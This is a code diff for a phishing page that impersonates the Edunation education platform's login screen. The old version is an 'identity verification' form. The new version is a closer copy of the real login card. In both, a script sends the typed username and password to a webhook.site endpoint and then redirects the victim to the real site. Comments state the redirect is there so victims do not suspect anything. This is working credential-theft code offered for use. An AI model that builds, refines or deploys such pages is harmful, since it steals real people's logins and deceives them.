@@ -1,50 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Edunation | Identity Verification</title>
+    <meta charset="UTF-8">
+    <title>Edunation | Login</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); width: 340px; border-top: 6px solid #0056b3; }
-        .logo { font-size: 26px; font-weight: bold; color: #0056b3; text-align: center; margin-bottom: 5px; }
-        .sub { font-size: 14px; color: #555; text-align: center; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
-        button { width: 100%; padding: 12px; background-color: #0056b3; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 15px; }
-        button:hover { background-color: #004494; }
-        .notice { font-size: 11px; color: #888; text-align: center; margin-top: 20px; line-height: 1.4; }
+        body {
+            margin: 0; padding: 0;
+            background-color: #0088cc;
+            background-image: url('https://www.transparenttextures.com/patterns/cubes.png'); /* Pattern approximation */
+            display: flex; justify-content: center; align-items: center; height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-card {
+            background: white; padding: 50px 40px; border-radius: 15px;
+            width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center;
+        }
+        .logo { font-size: 48px; font-weight: bold; color: #00adef; margin-bottom: 30px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 12px; color: #999; margin-bottom: 5px; }
+        input {
+            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 20px;
+            box-sizing: border-box; font-size: 14px; outline: none;
+        }
+        .forgot { font-size: 11px; color: #999; text-align: right; margin-top: 5px; cursor: pointer; }
+        .btn-login {
+            background-color: #72c053; color: white; border: none; padding: 12px;
+            width: 100%; border-radius: 20px; font-weight: bold; font-size: 16px;
+            margin-top: 20px; cursor: pointer;
+        }
+        .or { color: #ccc; margin: 20px 0; font-size: 12px; position: relative; }
+        .social-btn {
+            border: 1px solid #ddd; padding: 10px; border-radius: 20px;
+            font-size: 13px; color: #555; margin-bottom: 10px; display: flex;
+            align-items: center; justify-content: center; cursor: pointer;
+        }
+        .footer-links { font-size: 10px; color: #999; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">Edunation</div>
-        <div class="sub">Please re-verify your instructor credentials to continue.</div>
-        <form id="p-form">
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button type="submit">Verify Account</button>
+    <div class="login-card">
+        <div class="logo">edunation</div>
+        <form id="p-gate">
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="user" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <div class="forgot">Forgot your password?</div>
+                <input type="password" id="pass" required>
+            </div>
+            <button type="submit" class="btn-login">Log In</button>
         </form>
-        <div class="notice">
-            Secure Encryption Enforced (AES-256).<br>
-            Authorized Personnel Only.
-        </div>
+        <div class="or">— OR —</div>
+        <div class="social-btn">Sign in with Google</div>
+        <div class="social-btn">Sign in with Microsoft</div>
+        <div class="footer-links">Don't have an account? Sign Up | About Edunation Support Terms</div>
     </div>
 
     <script>
-        // Auto-fill email from URL parameter (?email=...)
-        const params = new URLSearchParams(window.location.search);
-        if(params.has('email')) { document.getElementById('email').value = params.get('email'); }
-
-        document.getElementById('p-form').addEventListener('submit', function(e) {
+        document.getElementById('p-gate').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
 
-            // REPLACE THE URL BELOW WITH YOUR WEBHOOK.SITE URL
-            fetch("	https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
+            // Using your exact Webhook URL
+            fetch("https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
                 method: "POST",
                 mode: "no-cors",
-                body: JSON.stringify({ user: email, password: pass })
+                body: JSON.stringify({ username: u, password: p })
             }).then(() => {
-                // Redirects back to the real Edunation login so they don't suspect anything
+                // Redirect to the real site to hide tracks
                 window.location.href = "https://edunation.com/login";
             });
         });
